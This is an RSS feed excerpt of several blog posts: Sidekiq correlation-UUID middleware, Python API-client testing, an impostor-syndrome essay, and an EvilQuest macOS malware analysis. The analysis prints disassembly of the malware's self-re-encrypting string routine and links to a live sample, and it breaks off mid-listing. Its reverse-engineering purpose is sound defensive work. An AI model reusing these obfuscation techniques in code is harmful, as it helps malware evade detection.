<p>Fortunately, Sidekiq has us covered as it allows us to add some extra behavior when enqueuing the job and around the execution of the job. We can do that using <a href="https://github.com/mperham/sidekiq/wiki/Middleware">middlewares</a>.</p>

<p>What we will need are two middlewares:</p>
<ul>
  <li>a client middleware that will inject the correlation UUID to the job</li>
  <li>a server middleware that will set the correlation UUID</li>
</ul>

<p>Here is an example implementation of the desired client middleware:</p>

<div><div><pre><code><span>class</span> <span>InjectCorrelationUuidMiddleware</span>
  <span>def</span> <span>call</span><span>(</span><span>_worker_class</span><span>,</span> <span>job</span><span>,</span> <span>_queue</span><span>,</span> <span>_redis_pool</span><span>)</span>
    <span>job</span><span>[</span><span>"correlation_uuid"</span><span>]</span> <span>=</span> <span>RequestCorrelationUuidGenerator</span><span>.</span><span>uuid</span>
    <span>yield</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Since <code>job</code> is a hash of a serialized job, we can put there pretty much anything we want. That way, we will make sure that the correlation UUID is stored in Redis.</p>

<p>And here is the server middleware:</p>

<div><div><pre><code><span>class</span> <span>SetCorrelationUuidMiddleware</span>
  <span>def</span> <span>call</span><span>(</span><span>_worker</span><span>,</span> <span>job</span><span>,</span> <span>_queue</span><span>)</span>
    <span>RequestCorrelationUuidGenerator</span><span>.</span><span>uuid</span> <span>=</span> <span>job</span><span>.</span><span>fetch</span><span>(</span><span>"correlation_uuid"</span><span>,</span> <span>RequestCorrelationUuidGenerator</span><span>.</span><span>uuid</span><span>)</span>
    <span>yield</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>The last thing we need to do is to actually inject these middlewares so that Sidekiq can make the proper use of them. We can put that in an initializer:</p>

<div><div><pre><code><span>Sidekiq</span><span>.</span><span>configure_client</span> <span>do</span> <span>|</span><span>config</span><span>|</span>
  <span>config</span><span>.</span><span>client_middleware</span> <span>do</span> <span>|</span><span>chain</span><span>|</span>
    <span>chain</span><span>.</span><span>add</span> <span>InjectCorrelationUuidMiddleware</span>
  <span>end</span>
<span>end</span>

<span>Sidekiq</span><span>.</span><span>configure_server</span> <span>do</span> <span>|</span><span>config</span><span>|</span>
  <span>config</span><span>.</span><span>client_middleware</span> <span>do</span> <span>|</span><span>chain</span><span>|</span>
    <span>chain</span><span>.</span><span>add</span> <span>InjectCorrelationUuidMiddleware</span>
  <span>end</span>

  <span>config</span><span>.</span><span>server_middleware</span> <span>do</span> <span>|</span><span>chain</span><span>|</span>
    <span>chain</span><span>.</span><span>add</span> <span>SetCorrelationUuidMiddleware</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>To understand more about middlewares, it would definitely help to get through the <a href="https://github.com/mperham/sidekiq/wiki/Middleware">docs</a>. What is important to remember here is that jobs can also enqueue other jobs. That’s why we need to add <code>SetCorrelationUuidMiddleware</code> twice - one for the client (e.g., for the request) and for the server (other jobs).</p>

<h2 id="alternatives-and-similar-problems">Alternatives and similar problems</h2>

<p>If you find yourself often wondering about the causality between the events, state transition, and trying to figure out how you exactly ended up in a given state, you might consider changing the implementation of your domain model and perhaps introduce CQRS and Event Sourcing. You might also want to check Sagas and Process Managers. Even though these are the concepts that are used rather in distributed systems, you might still find them useful if you have a complex logic that gets executed in the jobs that often enqueue other jobs.</p>

<h2 id="wrapping-up">Wrapping Up</h2>

<p>Having <strong>correlation UUID</strong> assigned to <strong>PaperTrail Versions</strong> is something that might significantly <strong>help with debugging</strong>. Fortunately, it’s something that is not that difficult to implement.</p>


      
      <section>
  <b>posted in:</b>

  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/ruby">
        Ruby,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/rails">
        Rails,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/ruby-on-rails">
        Ruby on Rails,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/paper-trail">
        Paper Trail,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/audit-log">
        Audit Log,
      </a>
    </span>
  
    <span>
      <a href="https://karolgalanciak.com/blog/categories/correlation-uuid">
        Correlation UUID
      </a>
    </span>
  
</section>

    </div></div>]]>
            </description>
            <link>https://karolgalanciak.com/blog/2020/09/20/tracking-all-paper-trail-version-from-a-single-request-with-correlation-uuids/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532550</guid>
            <pubDate>Sun, 20 Sep 2020 07:48:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Test API Client Applications in Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532337">thread link</a>) | @miguendes
<br/>
September 19, 2020 | https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81 | <a href="https://web.archive.org/web/*/https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>In this tutorial, we’ll learn how to unit test code that issues HTTP requests in Python. Unit tests are meant to test a single unit of behavior. A well-known rule of thumb is to isolate code that reaches external dependencies. For instance, when testing a code that performs HTTP requests, we must replace the real call by a fake call during test time. This way we can to unit test it without performing a request every time we run the test. The question is, how can we isolate it? Hopefully, that’s what I’m going to answer in this post! I’ll not only show you how to do it but also weigh the pros and cons of each approach.</p>
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a href="#requirements">Requirements</a></li>
<li><a href="#creating-a-demo-app">Creating a Demo App</a><ul>
<li><a href="#retrieving-the-data">Retrieving the Data</a></li>
</ul>
</li>
<li><a href="#1-using-mocks">Using Mocks</a></li>
<li><a href="#2-using-an-adapter">Using an Adapter</a></li>
<li><a href="#3-using-vcrpy">Using <code>VCR.py</code></a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
<h2 id="requirements">Requirements</h2>
<ul>
<li><code>Python 3.8</code></li>
<li><code>pytest-mock</code></li>
<li><code>requests</code></li>
<li><code>flask</code></li>
<li><code>requests</code></li>
<li><code>responses</code></li>
<li><code>VCR.py</code></li>
</ul>
<h2 id="creating-a-demo-app">Creating a Demo App</h2>
<p>To put this problem in context, let's imagine that we're building a weather app. This app uses a third-party API to retrieve weather information for a particular city. Our app must generate a simple HTML page, like the image below.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1600427026729/SbZKkiywH.png?auto=format&amp;q=60" alt="weather_app.png">
To get the information about the weather, we must find it somewhere. Fortunately,  <a target="_blank" href="https://openweathermap.org/">OpenWeatherMap</a> provides everything we need through its REST API service.</p>
<blockquote>
<p>Ok, that's cool, but how can we use it? </p>
</blockquote>
<p>We can get everything we need by sending a GET request to: <code>'https://api.openweathermap.org/data/2.5/weather?q={city_name}&amp;appid={api_key}&amp;units=metric'</code>. For this tutorial, we’ll parametrize the city name and settle with the metric unit.</p>
<h3 id="retrieving-the-data">Retrieving the Data</h3>
<p>To retrieve the weather data, we'll use <a target="_blank" href="https://github.com/psf/requests"><code>requests</code></a>. We can create a function that receives a city name as parameter and returns a <em>json</em>. The <em>json</em> will contain the temperature, weather description, sunset, sunrise time and so on. </p>
<p>The example below illustrates such function.</p>
<pre><code><span><span>def</span> <span>find_weather_for</span>(<span>city: str</span>) -&gt; dict:</span>
    <span>"""Queries the weather API and returns the weather data for a particular city."""</span>
    url = API.format(city_name=city, api_key=API_KEY)
    resp = requests.get(url)
    <span>return</span> resp.json()
</code></pre>
<p>The URL is made up from two global variables.</p>
<pre><code>BASE_URL = <span>"https://api.openweathermap.org/data/2.5/weather"</span>
API = BASE_URL + <span>"?q={city_name}&amp;appid={api_key}&amp;units=metric"</span>
</code></pre>
<p>The API returns a <em>json</em> in this format:</p>
<pre><code>{
  <span>"coord"</span>: {
    <span>"lon"</span>: <span>-0.13</span>,
    <span>"lat"</span>: <span>51.51</span>
  },
  <span>"weather"</span>: [
    {
      <span>"id"</span>: <span>800</span>,
      <span>"main"</span>: <span>"Clear"</span>,
      <span>"description"</span>: <span>"clear sky"</span>,
      <span>"icon"</span>: <span>"01d"</span>
    }
  ],
  <span>"base"</span>: <span>"stations"</span>,
  <span>"main"</span>: {
    <span>"temp"</span>: <span>16.53</span>,
    <span>"feels_like"</span>: <span>15.52</span>,
    <span>"temp_min"</span>: <span>15</span>,
    <span>"temp_max"</span>: <span>17.78</span>,
    <span>"pressure"</span>: <span>1023</span>,
    <span>"humidity"</span>: <span>72</span>
  },
  <span>"visibility"</span>: <span>10000</span>,
  <span>"wind"</span>: {
    <span>"speed"</span>: <span>2.1</span>,
    <span>"deg"</span>: <span>40</span>
  },
  <span>"clouds"</span>: {
    <span>"all"</span>: <span>0</span>
  },
  <span>"dt"</span>: <span>1600420164</span>,
  <span>"sys"</span>: {
    <span>"type"</span>: <span>1</span>,
    <span>"id"</span>: <span>1414</span>,
    <span>"country"</span>: <span>"GB"</span>,
    <span>"sunrise"</span>: <span>1600407646</span>,
    <span>"sunset"</span>: <span>1600452509</span>
  },
  <span>"timezone"</span>: <span>3600</span>,
  <span>"id"</span>: <span>2643743</span>,
  <span>"name"</span>: <span>"London"</span>,
  <span>"cod"</span>: <span>200</span>
}
</code></pre>
<p>The data is returned as a python dictionary when we call <code>resp.json()</code>. In order to encapsulate all the details, we can represent them as a <code>dataclass</code>. This class has a factory method that gets the dictionary and returns a <code>WeatherInfo</code> instance.</p>
<p>This is good because we keep the representation stable. For example, if the API changes the way it structures the <em>json</em>, we can change the logic in just one place, in the <code>from_dict</code> method. So, other parts of the code won’t be affected. We can even get information from different sources and combining them in the <code>from_dict</code> method!</p>
<pre><code><span>@dataclass</span>
<span><span>class</span> <span>WeatherInfo</span>:</span>
    temp: float
    sunset: str
    sunrise: str
    temp_min: float
    temp_max: float
    desc: str

<span>    @classmethod</span>
    <span><span>def</span> <span>from_dict</span>(<span>cls, data: dict</span>) -&gt; "WeatherInfo":</span>
        <span>return</span> cls(
            temp=data[<span>"main"</span>][<span>"temp"</span>],
            temp_min=data[<span>"main"</span>][<span>"temp_min"</span>],
            temp_max=data[<span>"main"</span>][<span>"temp_max"</span>],
            desc=data[<span>"weather"</span>][<span>0</span>][<span>"main"</span>],
            sunset=format_date(data[<span>"sys"</span>][<span>"sunset"</span>]),
            sunrise=format_date(data[<span>"sys"</span>][<span>"sunrise"</span>]),
        )
</code></pre>
<p>Now, let's create a function called <code>retrieve_weather</code>. We'll use this function to call the API and return a <code>WeatherInfo</code> so we can build our HTML page.</p>
<pre><code><span><span>def</span> <span>retrieve_weather</span>(<span>city: str</span>) -&gt; WeatherInfo:</span>
    <span>"""Finds the weather for a city and returns a WeatherInfo instance."""</span>
    data = find_weather_for(city)
    <span>return</span> WeatherInfo.from_dict(data)
</code></pre>
<p>Good, we have the basic building blocks for our app. Before moving forward, let's unit test those functions.</p>
<h2 id="1-using-mocks">1. Using Mocks</h2>
<p><a target="_blank" href="https://en.wikipedia.org/wiki/Mock_object">According to wikipedia</a>, a mock object is an object that simulates the behavior of a real object by mimicking it. In Python, we can mock any object using the <code>unittest.mock</code> lib that is part of the standard library. To test the <code>retrieve_weather</code> function, we can then mock <code>requests.get</code> and return a static data.</p>
<h3 id="pytest-mock"><code>pytest-mock</code></h3>
<p>For this tutorial, we’ll use <code>pytest</code> as our testing framework of choice. <code>pytest</code> is a very extensible library that allows the extension through plugins. And to accomplish our <em>mocking</em> goals, let’s use <code>pytest-mock</code>. This plugin abstracts a bunch of setups from <code>unittest.mock</code> and makes our testing code very concise. If you are curious, I discuss more about it in <a target="_blank" href="https://miguendes.me/7-pytest-plugins-you-must-definitely-use-ckesvzzt60014e2s1b89a08o7">another blog post</a>.</p>
<blockquote>
<p>Ok, enough talking, show me the code.</p>
</blockquote>
<p>Here's a complete test case for the <code>retrieve_weather</code> function. This test uses two fixures, one is the <code>mocker</code> fixture provided by the <code>pytest-mock</code> plugin. The other one is ours. It's just the static data we saved from a previous request.</p>
<pre><code><span>@pytest.fixture()</span>
<span><span>def</span> <span>fake_weather_info</span>():</span>
    <span>"""Fixture that returns a static weather data."""</span>
    <span>with</span> open(<span>"tests/resources/weather.json"</span>) <span>as</span> f:
        <span>return</span> json.load(f)
</code></pre>
<pre><code><span><span>def</span> <span>test_retrieve_weather_using_mocks</span>(<span>mocker, fake_weather_info</span>):</span>
    <span>"""Given a city name, test that a HTML report about the weather is generated
    correctly."""</span>
    
    fake_resp = mocker.Mock()
    
    fake_resp.json = mocker.Mock(return_value=fake_weather_info)
    
    fake_resp.status_code = HTTPStatus.OK

    mocker.patch(<span>"weather_app.requests.get"</span>, return_value=fake_resp)

    weather_info = retrieve_weather(city=<span>"London"</span>)
    <span>assert</span> weather_info == WeatherInfo.from_dict(fake_weather_info)
</code></pre>
<p>If we run the test, we get the following output:</p>
<pre><code>============================= test session starts ==============================
...[omitted]...
tests/test_weather_app.py::test_retrieve_weather_using_mocks PASSED      [100%]
============================== 1 passed in 0.20s ===============================
Process finished with exit code 0
</code></pre>
<p>Great, our tests pass! But... Life is not a bed of roses. This test has pros and cons. Let's take a look at them.</p>
<h4 id="pros">Pros</h4>
<p>Well, one pro we already discussed is that by mocking the return of the API we make our tests easier. We isolate the communication with the API and make the test predictable. It will always return what we want.</p>
<h4 id="cons">Cons</h4>
<p>As cons, the problem is, what if we don’t want to use <code>requests</code> anymore and decide to go with the standard’s lib <code>urllib</code>. Every time we change the implementation of <code>find_weather_for</code> we will have to adapt the test. A good test is a test that doesn’t change when our implementation change. So, by mocking, we end up coupling our test with the implementation.</p>
<p>Also, another downside is the amount of setup we have to do before calling the function. At lest, 3 lines of code.</p>
<pre><code>...
    
    fake_resp = mocker.Mock()
    
    fake_resp.json = mocker.Mock(return_value=fake_weather_info)
    
    fake_resp.status_code = HTTPStatus.OK
...
</code></pre>
<blockquote>
<p>Can we do better? </p>
</blockquote>
<p>Yes, please, follow along. Let's see now how to improve it a bit.</p>
<h3 id="responses"><code>responses</code></h3>
<p>Mocking <code>requests</code> using the <code>mocker</code> feature has the downside of having a long setup. A good way to avoid that is to use a library that intercepts <code>requests</code> calls and patch it. There are more than one lib for that, but simplest to me is <code>responses</code>. Let’s see how can we use it to replace <code>mock</code>.</p>
<pre><code><span>@responses.activate</span>
<span><span>def</span> <span>test_retrieve_weather_using_responses</span>(<span>fake_weather_info</span>):</span>
    <span>"""Given a city name, test that a HTML report about the weather is generated
    correctly."""</span>
    api_uri = API.format(city_name=<span>"London"</span>, api_key=API_KEY)
    responses.add(responses.GET, api_uri, json=fake_weather_info, status=HTTPStatus.OK)

    weather_info = retrieve_weather(city=<span>"London"</span>)
    <span>assert</span> weather_info == WeatherInfo.from_dict(fake_weather_info)
</code></pre>
<p>Again, this function makes use of our <code>fake_weather_info</code> fixture.</p>
<p>Good... let's run the test.</p>
<pre><code>============================= test session starts ==============================
...
tests/test_weather_app.py::test_retrieve_weather_using_responses PASSED  [100%]
============================== 1 passed in 0.19s ===============================
</code></pre>
<p>Great! This test pass too. But... It's still not that great...</p>
<h3 id="pros">Pros</h3>
<p>The good thing about using libraries like <code>responses</code> is that we don't need to patch <code>requests</code> ourselves. We save some setup by delegating the abstraction to the library. However, in case you haven't noticed, we have problems.</p>
<h3 id="cons">Cons</h3>
<p>Again, the problem is, much like <code>unittest.mock</code>, our test is coupled to the implementation. If we replace <code>requests</code>, our test break.</p>
<h2 id="2-using-an-adapter">2. Using an Adapter</h2>
<blockquote>
<p>If by using mocks we couple our tests, what can we do?</p>
</blockquote>
<p>Let’s image the following scenario: Say that we can no longer use <code>requests</code> and we’ll have to replace it by <code>urllib</code>, since it comes with Python. Not only that, we learned the lessons of not coupling test code with implementation and we want to avoid that in the future. We want to replace <code>urllib</code> and not have to rewrite the tests.</p>
<p>It turns out we can abstract away the code that performs the GET request.</p>
<blockquote>
<p>Really? How?</p>
</blockquote>
<p>We can abstract it by using an adapter. The adapter is a design pattern that is used to encapsulate, or wrap, the interface of other class and expose it as a new interface. This way we can change the adapters without changing our code. For example, we can encapsulate the details about <code>requests</code> in our <code>find_weather_for</code> and expose it via a function that takes only the URL.</p>
<p>So, this...</p>
<pre><code><span><span>def</span> <span>find_weather_for</span>(<span>city: str</span>) -&gt; dict:</span>
    <span>"""Queries the weather …</span></code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81">https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81</a></em></p>]]>
            </description>
            <link>https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532337</guid>
            <pubDate>Sun, 20 Sep 2020 06:47:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You Are an Impostor]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532307">thread link</a>) | @abyx
<br/>
September 19, 2020 | https://softwaresaltmines.com/2020/09/09/you-are-an-impostor/ | <a href="https://web.archive.org/web/*/https://softwaresaltmines.com/2020/09/09/you-are-an-impostor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-2229">

	
<!-- .entry-header -->

	<div>

		<div>

			
<h5>By Jim Grey (<a rel="noreferrer noopener" href="https://softwaresaltmines.com/about/" target="_blank">about</a>)</h5>



<p>I hired a software developer right out of college. He had a lot to learn, but he learned it steadily. Yet he admitted to me privately that he wasn’t sure he belonged. He thought that the other developers spoke so confidently and delivered so competently. He compared himself to them and, in his mind, came up wanting.</p>



<div><figure><img loading="lazy" data-attachment-id="2237" data-permalink="https://dev.jimgrey.net/me-at-crown-hill/" data-orig-file="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg" data-orig-size="1071,1339" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;Jim Grey&quot;,&quot;camera&quot;:&quot;F2AS&quot;,&quot;caption&quot;:&quot;Nikon F2\r50mm f\/2 AI Nikkor\rFujifilm Neopan 100 Acros\r\rMy son Damion shot these. I was going for a serious look but I think what I got was a bored look.&quot;,&quot;created_timestamp&quot;:&quot;1472162857&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;Me at Crown Hill&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Me at Crown Hill" data-image-description="" data-medium-file="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=240" data-large-file="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=580" src="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=819" alt="" width="413" height="516" srcset="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=819 819w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=413 413w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=826 826w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=120 120w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=240 240w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=768 768w" sizes="(max-width: 413px) 100vw, 413px"><figcaption>Impostor.</figcaption></figure></div>



<p>What he didn’t know was that I was leading developers for the first time. I’d been in management roles in the industry for a very long time, but always of testing and communications teams. </p>



<p>Worse, I hadn’t written a meaningful line of code in about a decade. Even then, most of that code was test automation. That’s not the same as writing product code.</p>



<p>Yet here I was, leading developers. The CTO who hired me wanted my skill in managing people, leading projects, and refining process. But I had so much to learn about modern software development. It was embarrassing to need the developers to explain the basics to me.</p>



<p>I told this young developer this story and admitted that I felt like an impostor, too. But I’d experienced impostor syndrome before. I knew that with effort and time I’d learn what I needed to learn and the feeling would abate. More importantly, even with all I needed to learn, I knew I had something valuable to offer right now. He did too, I told him.</p>



<p>We all figure it out as we go. In time, we build experience that lets us get it right more often.</p>



<p>What I wish I’d told him, what I’ve learned since then, is that there are three kinds of impostors. There are the impostors who don’t know they’re impostors. They’re so self-possessed that they overestimate themselves. There are the impostors who know it but do everything they can to hide it. They live in fear and anxiety that they will be found out. And then there are the impostors who know it, admit it to themselves, and sometimes even admit it to others. They’re the ones who can grow the fastest.</p>



<p>This young developer was the best kind: he admitted it. It let me tell him my own story, which helped put his mind at ease. Then it let us talk frankly about the areas where he felt like he didn’t know what he was doing, so I could pair him with other engineers who could level him up faster.</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
		<!-- .comments-wrapper -->

		
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://softwaresaltmines.com/2020/09/09/you-are-an-impostor/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532307</guid>
            <pubDate>Sun, 20 Sep 2020 06:37:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is macOS under the biggest malware attack ever?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532184">thread link</a>) | @todsacerdoti
<br/>
September 19, 2020 | https://reverse.put.as/2020/09/17/evilquest-revisited/ | <a href="https://web.archive.org/web/*/https://reverse.put.as/2020/09/17/evilquest-revisited/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    <div>
      <article role="main">
        <p>No. I just clickbaited you but don’t leave yet, keep reading for something fun!</p>
<p>A couple of days ago I found something curious on <a href="https://www.virustotal.com/gui/">VirusTotal</a>. There were more than 40 thousand binaries with the same size in a single day. That seemed very odd so I loaded two random binaries and compared their contents. The only difference was on strings section.</p>
<p>VirusTotal detections were very low (two to three) and identified the samples as EvilQuest/ThiefQuest malware.</p>
<p>To prove that all the binaries were the same except for strings, I wrote a quick <a href="https://github.com/gdbinit/evilquest_stats">Mach-O stats</a> utility in <a href="https://golang.org/">Go</a> (yes, 2020 is this crazy!) to hash the code and strings sections separately. The hypothesis is that the code section would have the same hash for all the samples, and the strings section would have a unique hash for each sample. The output confirmed that this was indeed the case - same code, different strings.</p>
<p>Running this program against 206091 binaries totalling 34GB of data:</p>
<div><pre><code data-lang="bash">Mach-O Stats
<span>(</span>c<span>)</span> <span>2020</span> Pedro Vilaca. All Rights Reserved
 100% |███████████████████████████████████████| <span>(</span>206091/206091, <span>1563</span> it/s<span>)</span> <span>[</span>2m11s:0s<span>]</span>
__text map
cd87dfd659fc2334ccc59093c1f41ba9abf4c88046d438ddd8bc2d82f55859d7 <span>206091</span>
</code></pre></div><p>Given that the strings are encrypted/obfuscated, my first idea was that this could be a new version with mutated versions being used in different sources. Doesn’t make that much sense given that the code was the same but given that EvilQuest has ransomware features, this could be for example different BitCoin wallets for each sample.</p>
<p>Now it was time to load one of the samples into a disassembler and give a look at its contents. Assuming that the VirusTotal detections were correct even if too low, I grabbed the <a href="https://objective-see.com/downloads/malware/EvilOSX.zip">known sample</a> of EvilQuest. This sample contains debugging symbols so it’s very easy to navigate since most function names are explicit about their intents. The new sample fixed that mistake and had that information removed.</p>
<p>Before bringing the heavy diffing guns such as <a href="https://www.zynamics.com/software.html">BinDiff</a> and <a href="http://diaphora.re/">Diaphora</a> I like to give a look around to feel what’s going on. In this case the code had differences but was very similar. I could see what were clearly obfuscated/encrypted strings like in the original sample. So, I tried to find those functions using the symbols from the first sample. That was fast and easy and confirmed that the code was related (either from the same author or someone reusing it - attribution is hard :P).</p>
<p>Scott Knight released a <a href="https://github.com/carbonblack/tau-tools/tree/master/malware_specific/ThiefQuest">script</a> to decrypt/encrypt the original samples strings, but it doesn’t work with the new samples. It makes sense given that there are keys and tables that could have changed, and also what appears to be a new type of obfuscated/encrypted string format.</p>
<div><pre><code data-lang="plaintext">000Bg{0000090nQ4XL1qPsnl1ZjpKX0lkFoa0000053
</code></pre></div><p>The new strings type appears to always starts with <strong>000Bg{</strong>.</p>
<p>Learning a new programming language is easier when you have things to do with it, so I decided to write a <a href="https://github.com/gdbinit/evilquest_deobfuscator">decrypter/deobfuscator</a> in Go. In hindsight it wasn’t a smart decision because it’s kind of ugly to deal with buffers in Go and much easier in C (or I don’t know yet the best way to do it in Go).</p>
<div><pre><code data-lang="bash">$ ./evilquest_deobfuscator -s <span>"000Bg{0000090nQ4XL1qPsnl1ZjpKX0lkFoa0000053"</span>
EvilQuest String Deobfuscator
<span>(</span>c<span>)</span> <span>2020</span> Pedro Vilaca. All Rights Reserved
000Bg<span>{</span>0000090nQ4XL1qPsnl1ZjpKX0lkFoa0000053 -&gt; rb+
</code></pre></div><p>Meanwhile, the next day there were again more than 40 thousand new samples with the same size. Confirmed again that the only difference was in strings. While reversing and writing the strings decrypter I noticed that the hash of the sample I was using was modified. That generated a brain click and I went to bed thinking that this wasn’t a big malware campaign (very sad!) because it didn’t make sense with so many samples but it could be a VirusTotal issue. VirusTotal sandbox just got trapped into an analysis loop. This idea was reinforced by the fact that the sample had been submitted from the <strong>ZZ</strong> country code, meaning unknown origin. Connecting these two ideas reinforced my belief that this was the right path.</p>
<p>After I finished the <a href="https://github.com/gdbinit/evilquest_deobfuscator">strings decrypter</a> I could verify that my unique samples campaign hypothesis wasn’t valid. The strings were all the same, just encrypted/obfuscated with different keys.</p>
<p>So, the next step was to verify the code to see what was happening there. This was very easy to find since it’s the first thing the sample does.</p>
<p>At the entrypoint we can observe the mutation function being called first with <code>argv[0]</code> as its argument.</p>
<div><pre><code data-lang="plaintext">000000010001A8D0         public start
000000010001A8D0 start   proc near
(...)
000000010001A8D0         push    rbp
000000010001A8D1         mov     rbp, rsp
000000010001A8D4         sub     rsp, 2F0h
000000010001A8DB         mov     rax, cs:___stack_chk_guard_ptr
000000010001A8E2         mov     rax, [rax]
000000010001A8E5         mov     [rbp+var_8], rax
000000010001A8E9         mov     [rbp+var_94], 0
000000010001A8F3         mov     [rbp+var_98], edi
000000010001A8F9         mov     [rbp+var_A0], rsi
000000010001A900         mov     rax, [rbp+var_A0]
000000010001A907         mov     rdi, [rax]      ; argv[0]
000000010001A90A         call    fg_open_and_reencrypt_cstrings ; binary self modifies here
(...)
</code></pre></div><p>Next follows opening the executable itself with <code>rb+</code> mode (reading and writing). Fun enough there is a memory leak because the decrypted string buffer is malloc’ed in the decryptor function. One of the differences from this sample versus the previous is the increased usage of dynamically allocated memory, increasing the potential for memory leaks. There are a lot more memory leaks all over the code. Xcode Instruments has a nice leak detector (<em>hint, hint</em>).</p>
<div><pre><code data-lang="plaintext">000000010001A840 fg_open_and_reencrypt_cstrings proc near
000000010001A840                                         ; CODE XREF: start+3A↓p
000000010001A840
000000010001A840 var_24          = dword ptr -24h
000000010001A840 __filename      = qword ptr -20h
000000010001A840 FILE_pointer    = qword ptr -18h
000000010001A840 var_10          = qword ptr -10h
000000010001A840 var_4           = dword ptr -4
000000010001A840
000000010001A840         push    rbp
000000010001A841         mov     rbp, rsp
000000010001A844         sub     rsp, 30h
000000010001A848         mov     [rbp+var_10], rdi
000000010001A84C         mov     rdi, [rbp+var_10]
000000010001A850         lea     rax, a000bg0000090nq_18 ; "000Bg{0000090nQ4XL1qPsnl1ZjpKX0lkFoa000"...
000000010001A857         mov     [rbp+__filename], rdi
000000010001A85B         mov     rdi, rax
000000010001A85E         call    fg_decrypt_0000Bg_string ; decrypt/decode string
000000010001A863         mov     rdi, [rbp+__filename]
000000010001A867         mov     rsi, rax  ; "rb+"
000000010001A867                           ; memleak here since the returned ptr was calloc'ed
000000010001A86A         call    _fopen
000000010001A86F         mov     [rbp+FILE_pointer], rax
000000010001A873         cmp     [rbp+FILE_pointer], 0
000000010001A878         jz      loc_10001A890
000000010001A87E         mov     rdi, [rbp+FILE_pointer] ; FILE *
000000010001A882         call    _ftrylockfile
000000010001A887         cmp     eax, 0
000000010001A88A         jz      loc_10001A89C
000000010001A890
000000010001A890 loc_10001A890:            ; CODE XREF: fg_open_and_reencrypt_cstrings+38↑j
000000010001A890         mov     [rbp+var_4], 0FFFFFFFFh
000000010001A897         jmp     loc_10001A8C1
000000010001A89C ; ---------------------------------------------------------------------------
000000010001A89C
000000010001A89C loc_10001A89C:            ; CODE XREF: fg_open_and_reencrypt_cstrings+4A↑j
000000010001A89C         mov     rdi, [rbp+FILE_pointer] ; FILE* handle
000000010001A8A0         call    fg_reencrypt_cstrings
000000010001A8A5         mov     rdi, [rbp+FILE_pointer] ; FILE *
000000010001A8A9         call    _funlockfile
000000010001A8AE         mov     rdi, [rbp+FILE_pointer] ; FILE *
000000010001A8B2         call    _fclose
000000010001A8B7         mov     [rbp+var_4], 0
000000010001A8BE         mov     [rbp+var_24], eax
000000010001A8C1
000000010001A8C1 loc_10001A8C1:            ; CODE XREF: fg_open_and_reencrypt_cstrings+57↑j
000000010001A8C1         mov     eax, [rbp+var_4]
000000010001A8C4         add     rsp, 30h
000000010001A8C8         pop     rbp
000000010001A8C9         retn
000000010001A8C9 fg_open_and_reencrypt_cstrings endp
</code></pre></div><p>The <code>fg_reencrypt_cstrings</code> function is previous listing is where the mutation occurs.
The function will find the <code>__cstring</code> section and iterate over its contents, decrypting and encrypting the strings, and write back to the binary. The original binary is already modified when it returns from <code>fg_open_and_reencrypt_cstrings</code> .</p>
<div><pre><code data-lang="c">(...)
<span>for</span> ( j <span>=</span> <span>0</span>; j <span>&lt;</span> sg<span>-&gt;</span>nsects; <span>++</span>j ) {
    v12 <span>=</span> (<span>__int64</span>)sub_100006580(a1, v17, <span>80LL</span>);
